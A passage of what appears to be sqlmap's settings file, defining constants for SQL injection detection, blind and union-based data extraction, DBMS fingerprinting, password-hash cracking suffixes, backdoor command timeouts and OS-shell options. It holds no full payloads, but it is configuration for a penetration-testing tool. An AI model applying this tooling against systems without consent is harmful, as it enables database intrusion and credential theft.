disposed (because of high probability that the web server will reset it)\nPRECONNECT_CANDIDATE_TIMEOUT = 10\n\n# Servers known to cause issue with pre-connection mechanism (because of lack of multi-threaded support)\nPRECONNECT_INCOMPATIBLE_SERVERS = (\"SimpleHTTP\", \"BaseHTTP\")\n\n# Identify WAF/IPS inside limited number of responses (Note: for optimization purposes)\nIDENTYWAF_PARSE_LIMIT = 10\n\n# Maximum sleep time in \"Murphy\" (testing) mode\nMAX_MURPHY_SLEEP_TIME = 3\n\n# Regular expression used for extracting results from Google search\nGOOGLE_REGEX = r\"webcache\\.googleusercontent\\.com/search\\?q=cache:[^:]+:([^+]+)\\+&amp;cd=|url\\?\\w+=((?![^>]+webcache\\.googleusercontent\\.com)http[^>]+)&(sa=U|rct=j)\"\n\n# Google Search consent cookie\nGOOGLE_CONSENT_COOKIE = \"CONSENT=YES+shp.gws-%s-0-RC1.%s+FX+740\" % (time.strftime(\"%Y%m%d\"), \"\".join(random.sample(string.ascii_lowercase, 2)))\n\n# Regular expression used for extracting results from DuckDuckGo search\nDUCKDUCKGO_REGEX = r'<a class=\"result__url\" href=\"(htt[^\"]+)'\n\n# Regular expression used for extracting results from Bing search\nBING_REGEX = r'<h2><a href=\"([^\"]+)\" h='\n\n# Dummy user agent for search (if default one returns different results)\nDUMMY_SEARCH_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\"\n\n# Regular expression used for extracting content from \"textual\" tags\nTEXT_TAG_REGEX = r\"(?si)<(abbr|acronym|b|blockquote|br|center|cite|code|dt|em|font|h\\d|i|li|p|pre|q|strong|sub|sup|td|th|title|tt|u)(?!\\w).*?>(?P<result>[^<]+)\"\n\n# Regular expression used for recognition of IP addresses\nIP_ADDRESS_REGEX = r\"\\b(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\"\n\n# Regular expression used for recognition of generic \"your ip has been blocked\" messages\nBLOCKED_IP_REGEX = r\"(?i)(\\A|\\b)ip\\b.*\\b(banned|blocked|block list|firewall)\"\n\n# Dumping characters used in GROUP_CONCAT MySQL technique\nCONCAT_ROW_DELIMITER = ','\nCONCAT_VALUE_DELIMITER = '|'\n\n# Coefficient used for a time-based query delay checking (must be >= 7)\nTIME_STDEV_COEFF = 7\n\n# Minimum response time that can be even considered as delayed (not a complete requirement)\nMIN_VALID_DELAYED_RESPONSE = 0.5\n\n# Standard deviation after which a warning message should be displayed about connection lags\nWARN_TIME_STDEV = 0.5\n\n# Minimum length of usable union injected response (quick defense against substr fields)\nUNION_MIN_RESPONSE_CHARS = 10\n\n# Coefficient used for a union-based number of columns checking (must be >= 7)\nUNION_STDEV_COEFF = 7\n\n# Length of queue for candidates for time delay adjustment\nTIME_DELAY_CANDIDATES = 3\n\n# Default value for HTTP Accept header\nHTTP_ACCEPT_HEADER_VALUE = \"*/*\"\n\n# Default value for HTTP Accept-Encoding header\nHTTP_ACCEPT_ENCODING_HEADER_VALUE = \"gzip,deflate\"\n\n# Default timeout for running commands over backdoor\nBACKDOOR_RUN_CMD_TIMEOUT = 5\n\n# Number of seconds to wait for thread finalization at program end\nTHREAD_FINALIZATION_TIMEOUT = 1\n\n# Maximum number of techniques used in inject.py/getValue() per one value\nMAX_TECHNIQUES_PER_VALUE = 2\n\n# In case of missing piece of partial union dump, buffered array must be flushed after certain size\nMAX_BUFFERED_PARTIAL_UNION_LENGTH = 1024\n\n# Maximum size of cache used in @cachedmethod decorator\nMAX_CACHE_ITEMS = 256\n\n# Suffix used for naming meta databases in DBMS(es) without explicit database name\nMETADB_SUFFIX = \"_masterdb\"\n\n# Number of times to retry the pushValue during the exceptions (e.g. KeyboardInterrupt)\nPUSH_VALUE_EXCEPTION_RETRY_COUNT = 3\n\n# Minimum time response set needed for time-comparison based on standard deviation\nMIN_TIME_RESPONSES = 30\n\n# Maximum time response set used during time-comparison based on standard deviation\nMAX_TIME_RESPONSES = 200\n\n# Minimum comparison ratio set needed for searching valid union column number based on standard deviation\nMIN_UNION_RESPONSES = 5\n\n# After these number of blanks at the end inference should stop (just in case)\nINFERENCE_BLANK_BREAK = 5\n\n# Use this replacement character for cases when inference is not able to retrieve the proper character value\nINFERENCE_UNKNOWN_CHAR = '?'\n\n# Character used for operation \"greater\" in inference\nINFERENCE_GREATER_CHAR = \">\"\n\n# Character used for operation \"greater or equal\" in inference\nINFERENCE_GREATER_EQUALS_CHAR = \">=\"\n\n# Character used for operation \"equals\" in inference\nINFERENCE_EQUALS_CHAR = \"=\"\n\n# Character used for operation \"not-equals\" in inference\nINFERENCE_NOT_EQUALS_CHAR = \"!=\"\n\n# String used for representation of unknown DBMS\nUNKNOWN_DBMS = \"Unknown\"\n\n# String used for representation of unknown DBMS version\nUNKNOWN_DBMS_VERSION = \"Unknown\"\n\n# Dynamicity boundary length used in dynamicity removal engine\nDYNAMICITY_BOUNDARY_LENGTH = 20\n\n# Dummy user prefix used in dictionary attack\nDUMMY_USER_PREFIX = \"__dummy__\"\n\n# Reference: http://en.wikipedia.org/wiki/ISO/IEC_8859-1\nDEFAULT_PAGE_ENCODING = \"iso-8859-1\"\n\ntry:\n    codecs.lookup(DEFAULT_PAGE_ENCODING)\nexcept LookupError:\n    DEFAULT_PAGE_ENCODING = \"utf8\"\n\n# Marker for program piped input\nSTDIN_PIPE_DASH = '-'\n\n# URL used in dummy runs\nDUMMY_URL = \"http://foo/bar?id=1\"\n\n# Timeout used during initial websocket (pull) testing\nWEBSOCKET_INITIAL_TIMEOUT = 3\n\n# The name of the operating system dependent module imported. The following names have currently been registered: 'posix', 'nt', 'mac', 'os2', 'ce', 'java', 'riscos'\nPLATFORM = os.name\nPYVERSION = sys.version.split()[0]\nIS_WIN = PLATFORM == \"nt\"\n\n# Check if running in terminal\nIS_TTY = hasattr(sys.stdout, \"fileno\") and os.isatty(sys.stdout.fileno())\n\n# DBMS system databases\nMSSQL_SYSTEM_DBS = (\"Northwind\", \"master\", \"model\", \"msdb\", \"pubs\", \"tempdb\", \"Resource\", \"ReportServer\", \"ReportServerTempDB\")\nMYSQL_SYSTEM_DBS = (\"information_schema\", \"mysql\", \"performance_schema\", \"sys\")\nPGSQL_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"pg_toast\", \"pgagent\")\nORACLE_SYSTEM_DBS = (\"ADAMS\", \"ANONYMOUS\", \"APEX_030200\", \"APEX_PUBLIC_USER\", \"APPQOSSYS\", \"AURORA$ORB$UNAUTHENTICATED\", \"AWR_STAGE\", \"BI\", \"BLAKE\", \"CLARK\", \"CSMIG\", \"CTXSYS\", \"DBSNMP\", \"DEMO\", \"DIP\", \"DMSYS\", \"DSSYS\", \"EXFSYS\", \"FLOWS_%\", \"FLOWS_FILES\", \"HR\", \"IX\", \"JONES\", \"LBACSYS\", \"MDDATA\", \"MDSYS\", \"MGMT_VIEW\", \"OC\", \"OE\", \"OLAPSYS\", \"ORACLE_OCM\", \"ORDDATA\", \"ORDPLUGINS\", \"ORDSYS\", \"OUTLN\", \"OWBSYS\", \"PAPER\", \"PERFSTAT\", \"PM\", \"SCOTT\", \"SH\", \"SI_INFORMTN_SCHEMA\", \"SPATIAL_CSW_ADMIN_USR\", \"SPATIAL_WFS_ADMIN_USR\", \"SYS\", \"SYSMAN\", \"SYSTEM\", \"TRACESVR\", \"TSMSYS\", \"WK_TEST\", \"WKPROXY\", \"WKSYS\", \"WMSYS\", \"XDB\", \"XS$NULL\")\nSQLITE_SYSTEM_DBS = (\"sqlite_master\", \"sqlite_temp_master\")\nACCESS_SYSTEM_DBS = (\"MSysAccessObjects\", \"MSysACEs\", \"MSysObjects\", \"MSysQueries\", \"MSysRelationships\", \"MSysAccessStorage\", \"MSysAccessXML\", \"MSysModules\", \"MSysModules2\")\nFIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCLICKHOUSE_SYSTEM_DBS = (\"information_schema\", \"INFORMATION_SCHEMA\", \"system\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\", \"opengauss\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")\nH2_ALIASES = (\"h2\",) + (\"ignite\", \"apache ignite\")\nINFORMIX_ALIASES = (\"informix\", \"ibm informix\", \"ibminformix\")\nMONETDB_ALIASES = (\"monet\", \"monetdb\",)\nDERBY_ALIASES = (\"derby\", \"apache derby\",)\nVERTICA_ALIASES = (\"vertica\",)\nMCKOI_ALIASES = (\"mckoi\",)\nPRESTO_ALIASES = (\"presto\",)\nALTIBASE_ALIASES = (\"altibase\",)\nMIMERSQL_ALIASES = (\"mimersql\", \"mimer\")\nCRATEDB_ALIASES = (\"cratedb\", \"crate\")\nCUBRID_ALIASES = (\"cubrid\",)\nCLICKHOUSE_ALIASES = (\"clickhouse\",)\nCACHE_ALIASES = (\"intersystems cache\", \"cachedb\", \"cache\", \"iris\")\nEXTREMEDB_ALIASES = (\"extremedb\", \"extreme\")\nFRONTBASE_ALIASES = (\"frontbase\",)\nRAIMA_ALIASES = (\"raima database manager\", \"raima\", \"raimadb\", \"raimadm\", \"rdm\", \"rds\", \"velocis\")\nVIRTUOSO_ALIASES = (\"virtuoso\", \"openlink virtuoso\")\n\nDBMS_DIRECTORY_DICT = dict((getattr(DBMS, _), getattr(DBMS_DIRECTORY_NAME, _)) for _ in dir(DBMS) if not _.startswith(\"_\"))\n\nSUPPORTED_DBMS = set(MSSQL_ALIASES + MYSQL_ALIASES + PGSQL_ALIASES + ORACLE_ALIASES + SQLITE_ALIASES + ACCESS_ALIASES + FIREBIRD_ALIASES + MAXDB_ALIASES + SYBASE_ALIASES + DB2_ALIASES + HSQLDB_ALIASES + H2_ALIASES + INFORMIX_ALIASES + MONETDB_ALIASES + DERBY_ALIASES + VERTICA_ALIASES + MCKOI_ALIASES + PRESTO_ALIASES + ALTIBASE_ALIASES + MIMERSQL_ALIASES + CLICKHOUSE_ALIASES + CRATEDB_ALIASES + CUBRID_ALIASES + CACHE_ALIASES + EXTREMEDB_ALIASES + RAIMA_ALIASES + VIRTUOSO_ALIASES)\nSUPPORTED_OS = (\"linux\", \"windows\")\n\nDBMS_ALIASES = ((DBMS.MSSQL, MSSQL_ALIASES), (DBMS.MYSQL, MYSQL_ALIASES), (DBMS.PGSQL, PGSQL_ALIASES), (DBMS.ORACLE, ORACLE_ALIASES), (DBMS.SQLITE, SQLITE_ALIASES), (DBMS.ACCESS, ACCESS_ALIASES), (DBMS.FIREBIRD, FIREBIRD_ALIASES), (DBMS.MAXDB, MAXDB_ALIASES), (DBMS.SYBASE, SYBASE_ALIASES), (DBMS.DB2, DB2_ALIASES), (DBMS.HSQLDB, HSQLDB_ALIASES), (DBMS.H2, H2_ALIASES), (DBMS.INFORMIX, INFORMIX_ALIASES), (DBMS.MONETDB, MONETDB_ALIASES), (DBMS.DERBY, DERBY_ALIASES), (DBMS.VERTICA, VERTICA_ALIASES), (DBMS.MCKOI, MCKOI_ALIASES), (DBMS.PRESTO, PRESTO_ALIASES), (DBMS.ALTIBASE, ALTIBASE_ALIASES), (DBMS.MIMERSQL, MIMERSQL_ALIASES), (DBMS.CLICKHOUSE, CLICKHOUSE_ALIASES), (DBMS.CRATEDB, CRATEDB_ALIASES), (DBMS.CUBRID, CUBRID_ALIASES), (DBMS.CACHE, CACHE_ALIASES), (DBMS.EXTREMEDB, EXTREMEDB_ALIASES), (DBMS.FRONTBASE, FRONTBASE_ALIASES), (DBMS.RAIMA, RAIMA_ALIASES), (DBMS.VIRTUOSO, VIRTUOSO_ALIASES))\n\nUSER_AGENT_ALIASES = (\"ua\", \"useragent\", \"user-agent\")\nREFERER_ALIASES = (\"ref\", \"referer\", \"referrer\")\nHOST_ALIASES = (\"host\",)\n\n# DBMSes with upper case identifiers\nUPPER_CASE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.H2, DBMS.HSQLDB, DBMS.DERBY, DBMS.ALTIBASE))\n\n# Default schemas to use (when unable to enumerate)\nH2_DEFAULT_SCHEMA = HSQLDB_DEFAULT_SCHEMA = \"PUBLIC\"\nVERTICA_DEFAULT_SCHEMA = \"public\"\nMCKOI_DEFAULT_SCHEMA = \"APP\"\nCACHE_DEFAULT_SCHEMA = \"SQLUser\"\n\n# DBMSes where OFFSET mechanism starts from 1\nPLUS_ONE_DBMSES = set((DBMS.ORACLE, DBMS.DB2, DBMS.ALTIBASE, DBMS.MSSQL, DBMS.CACHE))\n\n# Names that can't be used to name files on Windows OS\nWINDOWS_RESERVED_NAMES = (\"CON\", \"PRN\", \"AUX\", \"NUL\", \"COM1\", \"COM2\", \"COM3\", \"COM4\", \"COM5\", \"COM6\", \"COM7\", \"COM8\", \"COM9\", \"LPT1\", \"LPT2\", \"LPT3\", \"LPT4\", \"LPT5\", \"LPT6\", \"LPT7\", \"LPT8\", \"LPT9\")\n\n# Items displayed in basic help (-h) output\nBASIC_HELP_ITEMS = (\n    \"url\",\n    \"googleDork\",\n    \"data\",\n    \"cookie\",\n    \"randomAgent\",\n    \"proxy\",\n    \"testParameter\",\n    \"dbms\",\n    \"level\",\n    \"risk\",\n    \"technique\",\n    \"getAll\",\n    \"getBanner\",\n    \"getCurrentUser\",\n    \"getCurrentDb\",\n    \"getPasswordHashes\",\n    \"getDbs\",\n    \"getTables\",\n    \"getColumns\",\n    \"getSchema\",\n    \"dumpTable\",\n    \"dumpAll\",\n    \"db\",\n    \"tbl\",\n    \"col\",\n    \"osShell\",\n    \"osPwn\",\n    \"batch\",\n    \"checkTor\",\n    \"flushSession\",\n    \"tor\",\n    \"sqlmapShell\",\n    \"wizard\",\n)\n\n# Tags used for value replacements inside shell scripts\nSHELL_WRITABLE_DIR_TAG = \"%WRITABLE_DIR%\"\nSHELL_RUNCMD_EXE_TAG = \"%RUNCMD_EXE%\"\n\n# String representation for NULL value\nNULL = \"NULL\"\n\n# String representation for blank ('') value\nBLANK = \"<blank>\"\n\n# String representation for current database\nCURRENT_DB = \"CD\"\n\n# String representation for current user\nCURRENT_USER = \"CU\"\n\n# Name of SQLite file used for storing session data\nSESSION_SQLITE_FILE = \"session.sqlite\"\n\n# Regular expressions used for finding file paths in error messages\nFILE_PATH_REGEXES = (r\"<b>(?P<result>[^<>]+?)</b> on line \\d+\", r\"\\bin (?P<result>[^<>'\\\"]+?)['\\\"]? on line \\d+\", r\"(?:[>(\\[\\s])(?P<result>[A-Za-z]:[\\\\/][\\w. \\\\/-]*)\", r\"(?:[>(\\[\\s])(?P<result>/\\w[/\\w.~-]+)\", r\"\\bhref=['\\\"]file://(?P<result>/[^'\\\"]+)\", r\"\\bin <b>(?P<result>[^<]+): line \\d+\")\n\n# Regular expressions used for parsing error messages (--parse-errors)\nERROR_PARSING_REGEXES = (\n    r\"\\[Microsoft\\]\\[ODBC SQL Server Driver\\]\\[SQL Server\\](?P<result>[^<]+)\",\n    r\"<b>[^<]{0,100}(fatal|error|warning|exception)[^<]*</b>:?\\s*(?P<result>[^<]+)\",\n    r\"(?m)^\\s{0,100}(fatal|error|warning|exception):?\\s*(?P<result>[^\\n]+?)$\",\n    r\"(sql|dbc)[^>'\\\"]{0,32}(fatal|error|warning|exception)(</b>)?:\\s*(?P<result>[^<>]+)\",\n    r\"(?P<result>[^\\n>]{0,100}SQL Syntax[^\\n<]+)\",\n    r\"(?s)<li>Error Type:<br>(?P<result>.+?)</li>\",\n    r\"CDbCommand (?P<result>[^<>\\n]*SQL[^<>\\n]+)\",\n    r\"Code: \\d+. DB::Exception: (?P<result>[^<>\\n]*)\",\n    r\"error '[0-9a-f]{8}'((<[^>]+>)|\\s)+(?P<result>[^<>]+)\",\n    r\"\\[[^\\n\\]]{1,100}(ODBC|JDBC)[^\\n\\]]+\\](\\[[^\\]]+\\])?(?P<result>[^\\n]+(in query expression|\\(SQL| at /[^ ]+pdo)[^\\n<]+)\",\n    r\"(?P<result>query error: SELECT[^<>]+)\"\n)\n\n# Regular expression used for parsing charset info from meta html headers\nMETA_CHARSET_REGEX = r'(?si)<head>.*<meta[^>]+charset=\"?(?P<result>[^\"> ]+).*</head>'\n\n# Regular expression used for parsing refresh info from meta html headers\nMETA_REFRESH_REGEX = r'(?i)<meta http-equiv=\"?refresh\"?[^>]+content=\"?[^\">]+;\\s*(url=)?[\"\\']?(?P<result>[^\\'\">]+)'\n\n# Regular expression used for parsing Javascript redirect request\nJAVASCRIPT_HREF_REGEX = r'<script>\\s*(\\w+\\.)?location\\.href\\s*=[\"\\'](?P<result>[^\"\\']+)'\n\n# Regular expression used for parsing empty fields in tested form data\nEMPTY_FORM_FIELDS_REGEX = r'(&|\\A)(?P<result>[^=]+=)(?=&|\\Z)'\n\n# Reference: http://www.cs.ru.nl/bachelorscripties/2010/Martin_Devillers___0437999___Analyzing_password_strength.pdf\nCOMMON_PASSWORD_SUFFIXES = (\"1\", \"123\", \"2\", \"12\", \"3\", \"13\", \"7\", \"11\", \"5\", \"22\", \"23\", \"01\", \"4\", \"07\", \"21\", \"14\", \"10\", \"06\", \"08\", \"8\", \"15\", \"69\", \"16\", \"6\", \"18\")\n\n# Reference: http://www.the-interweb.com/serendipity/index.php?/archives/94-A-brief-analysis-of-40,000-leaked-MySpace-passwords.html\nCOMMON_PASSWORD_SUFFIXES += (\"!\", \".\", \"*\", \"!!\", \"?\", \";\", \"..\", \"!!!\", \", \", \"@\")\n\n# Splitter used between requests in WebScarab log files\nWEBSCARAB_SPLITTER = \"### Conversation\"\n\n# Splitter used between requests in BURP log files\nBURP_REQUEST_REGEX = r\"={10,}\\s+([A-Z]{3,} .+?)\\s+={10,}\"\n\n# Regex used for parsing XML Burp saved history items\nBURP_XML_HISTORY_REGEX = r'<port>(\\d+)</port>.*?<request base64=\"true\"><!\\[CDATA\\[([^]]+)'\n\n# Encoding used for Unicode data\nUNICODE_ENCODING = \"utf8\"\n\n# Reference: http://www.w3.org/Protocols/HTTP/Object_Headers.html#uri\nURI_HTTP_HEADER = \"URI\"\n\n# Uri format which could be injectable (e.g. www.site.com/id82)\nURI_INJECTABLE_REGEX = r\"//[^/]*/([^\\.*?]+)\\Z\"\n\n# Regex used for masking sensitive data\nSENSITIVE_DATA_REGEX = r\"(\\s|=)(?P<result>[^\\s=]*\\b%s\\b[^\\s]*)\\s\"\n\n# Options to explicitly mask in anonymous (unhandled exception) reports (along with anything carrying the <hostname> inside)\nSENSITIVE_OPTIONS = (\"hostname\", \"answers\", \"data\", \"dnsDomain\", \"googleDork\", \"authCred\", \"proxyCred\", \"tbl\", \"db\", \"col\", \"user\", \"cookie\", \"proxy\", \"fileRead\", \"fileWrite\", \"fileDest\", \"testParameter\", \"authCred\", \"sqlQuery\", \"requestFile\")\n\n# Maximum number of threads (avoiding connection issues and/or DoS)\nMAX_NUMBER_OF_THREADS = 10\n\n# Minimum range between minimum and maximum of statistical set\nMIN_STATISTICAL_RANGE = 0.01\n\n# Minimum value for comparison ratio\nMIN_RATIO = 0.0\n\n# Maximum value for comparison ratio\nMAX_RATIO = 1.0\n\n# Minimum length of sentence for automatic choosing of --string (in case of high matching ratio)\nCANDIDATE_SENTENCE_MIN_LENGTH = 10\n\n# Character used for marking injectable position inside provided data\nCUSTOM_INJECTION_MARK_CHAR = '*'\n\n# Wildcard value that can be used in option --ignore-code\nIGNORE_CODE_WILDCARD = '*'\n\n# Other way to declare injection position\nINJECT_HERE_REGEX = r\"(?i)%INJECT[_ ]?HERE%\"\n\n# Minimum chunk length used for retrieving data over error based payloads\nMIN_ERROR_CHUNK_LENGTH = 8\n\n# Maximum chunk length used for retrieving data over error based payloads\nMAX_ERROR_CHUNK_LENGTH = 1024\n\n# Do not escape the injected statement if it contains any of the following SQL keywords\nEXCLUDE_UNESCAPE = (\"WAITFOR DELAY '\", \" INTO DUMPFILE \", \" INTO OUTFILE \", \"CREATE \", \"BULK \", \"EXEC \", \"RECONFIGURE \", \"DECLARE \", \"'%s'\" % CHAR_INFERENCE_MARK)\n\n# Mark used for replacement of reflected values\nREFLECTED_VALUE_MARKER = \"__REFLECTED_VALUE__\"\n\n# Regular expression used for replacing border non-alphanum characters\nREFLECTED_BORDER_REGEX = r\"[^A-Za-z]+\"\n\n# Regular expression used for replacing non-alphanum characters\nREFLECTED_REPLACEMENT_REGEX = r\"[^\\n]{1,168}\"\n\n# Maximum time (in seconds) spent per reflective value(s) replacement\nREFLECTED_REPLACEMENT_TIMEOUT = 3\n\n# Maximum number of alpha-numerical parts in reflected regex (for speed purposes)\nREFLECTED_MAX_REGEX_PARTS = 10\n\n# Chars which can be used as a failsafe values in case of too long URL encoding value\nURLENCODE_FAILSAFE_CHARS = \"()|,\"\n\n# Factor used for yuge page multiplication\nYUGE_FACTOR = 1000\n\n# Maximum length of URL encoded value after which failsafe procedure takes away\nURLENCODE_CHAR_LIMIT = 2000\n\n# Default schema for Microsoft SQL Server DBMS\nDEFAULT_MSSQL_SCHEMA = \"dbo\"\n\n# Display hash attack info every mod number of items\nHASH_MOD_ITEM_DISPLAY = 11\n\n# Display marker for (cracked) empty password\nHASH_EMPTY_PASSWORD_MARKER = \"<empty>\"\n\n# Maximum integer value\nMAX_INT = sys.maxsize\n\n# Replacement for unsafe characters in dump table filenames\nUNSAFE_DUMP_FILEPATH_REPLACEMENT = '_'\n\n# Options that need to be restored in multiple targets run mode\nRESTORE_MERGED_OPTIONS = (\"col\", \"db\", \"dnsDomain\", \"privEsc\", \"tbl\", \"regexp\", \"string\", \"textOnly\", \"threads\", \"timeSec\", \"tmpPath\", \"uChar\", \"user\")\n\n# Parameters to be ignored in detection phase (upper case)\nIGNORE_PARAMETERS = (\"__VIEWSTATE\", \"__VIEWSTATEENCRYPTED\", \"__VIEWSTATEGENERATOR\", \"__EVENTARGUMENT\", \"__EVENTTARGET\", \"__EVENTVALIDATION\", \"ASPSESSIONID\", \"ASP.NET_SESSIONID\", \"JSESSIONID\", \"CFID\", \"CFTOKEN\")\n\n# Regular expression used for recognition of ASP.NET control parameters\nASP_NET_CONTROL_REGEX = r\"(?i)\\Actl\\d+\\$\"\n\n# Prefix for Google analytics cookie names\nGOOGLE_ANALYTICS_COOKIE_PREFIX = \"__UTM\"\n\n# Prefix for configuration overriding environment variables\nSQLMAP_ENVIRONMENT_PREFIX = \"SQLMAP_\"\n\n# General OS environment variables that can be used for setting proxy address\nPROXY_ENVIRONMENT_VARIABLES = (\"all_proxy\", \"ALL_PROXY\", \"http_proxy\", \"HTTP_PROXY\", \"https_proxy\", \"HTTPS_PROXY\")\n\n# Turn off resume console info to avoid potential slowdowns\nTURN_OFF_RESUME_INFO_LIMIT = 20\n\n# Strftime format for results file used in multiple target mode\nRESULTS_FILE_FORMAT = \"results-%m%d%Y_%I%M%p.csv\"\n\n# Official web page with the list of Python supported codecs\nCODECS_LIST_PAGE = \"http://docs.python.org/library/codecs.html#standard-encodings\"\n\n# Simple regular expression used to distinguish scalar from multiple-row commands (not sole condition)\nSQL_SCALAR_REGEX = r\"\\A(SELECT(?!\\s+DISTINCT\\(?))?\\s*\\w*\\(\"\n\n# Option/switch values to ignore during configuration save\nIGNORE_SAVE_OPTIONS = (\"saveConfig\",)\n\n# IP address of the localhost\nLOCALHOST = \"127.0.0.1\"\n\n# Default SOCKS ports used by Tor\nDEFAULT_TOR_SOCKS_PORTS = (9050, 9150)\n\n# Default HTTP ports used by Tor\nDEFAULT_TOR_HTTP_PORTS = (8123, 8118)\n\n# Percentage below which comparison engine could have problems\nLOW_TEXT_PERCENT = 20\n\n# Auxiliary value used in isDBMSVersionAtLeast() version comparison correction cases\nVERSION_COMPARISON_CORRECTION = 0.0001\n\n# These MySQL keywords can't go (alone) into versioned comment form (/*!...*/)\n# Reference: http://dev.mysql.com/doc/refman/5.1/en/function-resolution.html\nIGNORE_SPACE_AFFECTED_KEYWORDS = (\"CAST\", \"COUNT\", \"EXTRACT\", \"GROUP_CONCAT\", \"MAX\", \"MID\", \"MIN\", \"SESSION_USER\", \"SUBSTR\", \"SUBSTRING\", \"SUM\", \"SYSTEM_USER\", \"TRIM\")\n\n# Keywords expected to be in UPPERCASE in getValue()\nGET_VALUE_UPPERCASE_KEYWORDS = (\"SELECT\", \"FROM\", \"WHERE\", \"DISTINCT\", \"COUNT\")\n\nLEGAL_DISCLAIMER = \"Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\"\n\n# After this number of misses reflective removal mechanism is turned off (for speed up reasons)\nREFLECTIVE_MISS_THRESHOLD = 20\n\n# Regular expression used for extracting HTML title\nHTML_TITLE_REGEX = r\"(?i)<title>(?P<result>[^<]+)</title>\"\n\n# Table used for Base64 conversion in WordPress hash cracking routine\nITOA64 = \"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\n\n# Options/switches to be ignored in command-line parsing (e.g. those passed from Firefox)\nIGNORED_OPTIONS = (\"--compressed\",)\n\n# Chars used to quickly distinguish if the user provided tainted parameter values\nDUMMY_SQL_INJECTION_CHARS = \";()'\"\n\n# Simple check against dummy users\nDUMMY_USER_INJECTION = r\"(?i)[^\\w](AND|OR)\\s+[^\\s]+[=><]|\\bUNION\\b.+\\bSELECT\\b|\\bSELECT\\b.+\\bFROM\\b|\\b(CONCAT|information_schema|SLEEP|DELAY|FLOOR\\(RAND)\\b\"\n\n# Extensions skipped by crawler\nCRAWL_EXCLUDE_EXTENSIONS = 